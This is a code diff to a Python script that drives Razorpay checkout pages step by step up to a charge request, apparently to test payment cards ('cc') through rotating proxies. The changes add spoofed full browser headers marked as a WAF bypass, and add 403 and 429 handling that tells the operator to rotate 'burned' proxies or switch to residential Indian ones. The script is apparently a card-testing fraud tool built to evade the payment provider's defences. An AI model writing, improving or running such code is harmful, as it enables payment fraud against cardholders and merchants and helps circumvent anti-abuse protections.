@@ -130,7 +130,7 @@ def check_site(site_url, proxy=None, cc=None):
     if proxy:
         session.proxies.update(proxy)
 
-    # ===== PROXY HEALTH PROBE (fail fast) =====
+    # ===== PROXY HEALTH PROBE (fail fast, 2-3s) =====
     try:
         probe = session.get("https://api.ipify.org?format=json", verify=False, timeout=8)
         if probe.status_code != 200:
@@ -153,9 +153,29 @@ def check_site(site_url, proxy=None, cc=None):
 
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
 
+    # ============================================================
+    # ===== FULL BROWSER HEADERS (WAF BYPASS) ====================
+    # ============================================================
+    page_headers = {
+        "User-Agent": ua,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Cache-Control": "max-age=0",
+        "Connection": "keep-alive",
+    }
+
     # ===== PAGE LOAD =====
     try:
-        r = session.get(site_url, verify=False, timeout=30, headers={"Accept": "text/html,*/*", "User-Agent": ua})
+        r = session.get(site_url, verify=False, timeout=30, headers=page_headers)
     except requests.exceptions.ConnectionError as e:
         return f"NETWORK_ERROR: page load ({str(e)[:60]})"
     except requests.exceptions.Timeout:
@@ -163,9 +183,17 @@ def check_site(site_url, proxy=None, cc=None):
     except Exception as e:
         return f"NETWORK_ERROR: page load ({str(e)[:60]})"
 
+    # ===== 403 WAF DETECTION =====
+    if r.status_code == 403:
+        return "WAF_403: Proxy blocked by Razorpay (use residential Indian proxy)"
+    if r.status_code == 429:
+        return "RATE_LIMITED: Razorpay throttled this proxy (rotate proxy)"
+    if r.status_code != 200:
+        return f"HTTP_{r.status_code}: page load failed"
+
     m = re.search(r'var data = ({.*?});', r.text, re.DOTALL)
     if not m:
-        return "page data not found"
+        return "PAGE_DATA_NOT_FOUND: Razorpay page structure changed or proxy redirected"
     init_data = json.loads(m.group(1))
     if "error_code" in init_data:
         return str(init_data.get("message", "page error"))[:200]
@@ -207,6 +235,11 @@ def check_site(site_url, proxy=None, cc=None):
     except Exception as e:
         return f"NETWORK_ERROR: order create ({str(e)[:60]})"
 
+    if resp_o.status_code == 403:
+        return "WAF_403: Order create blocked (proxy burned, rotate)"
+    if resp_o.status_code == 429:
+        return "RATE_LIMITED: Order create throttled (rotate proxy)"
+
     try:
         od = json.loads(resp_o.text)
         if "error" in od:
@@ -238,13 +271,18 @@ def check_site(site_url, proxy=None, cc=None):
     except Exception as e:
         return f"NETWORK_ERROR: public session ({str(e)[:60]})"
 
+    if r_pub.status_code == 403:
+        return "WAF_403: Public session blocked (proxy burned)"
+    if r_pub.status_code == 429:
+        return "RATE_LIMITED: Public session throttled"
+
     sessid = (m.group(1) if (m := re.search(r'window.session_token="([^"]+)"', r_pub.text)) else "")
     if not sessid:
         m = re.search(r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']', r_pub.text)
         if m:
             sessid = m.group(1)
     if not sessid:
-        return "session_token not found"
+        return "SESSION_TOKEN_NOT_FOUND: Razorpay ne session nahi diya"
 
     h_pref = {
         "Accept": "*/*", "Content-type": "application/json", "Origin": "https://api.razorpay.com",
@@ -293,6 +331,11 @@ def check_site(site_url, proxy=None, cc=None):
         return "NETWORK_ERROR: checkout order timeout"
     except Exception as e:
         return f"NETWORK_ERROR: checkout order ({str(e)[:60]})"
+
+    if r_co.status_code == 403:
+        return "WAF_403: Checkout order blocked (proxy burned)"
+    if r_co.status_code == 429:
+        return "RATE_LIMITED: Checkout order throttled"
 
     try:
         coid_local = json.loads(r_co.text).get("checkout_id", checkout_id)
@@ -353,6 +396,11 @@ def check_site(site_url, proxy=None, cc=None):
         return "NETWORK_ERROR: charge timeout"
     except Exception as e:
         return f"NETWORK_ERROR: charge ({str(e)[:60]})"
+
+    if r_final.status_code == 403:
+        return "WAF_403: Charge blocked (proxy burned, rotate)"
+    if r_final.status_code == 429:
+        return "RATE_LIMITED: Charge throttled (rotate proxy)"
 
     txt = r_final.text
 
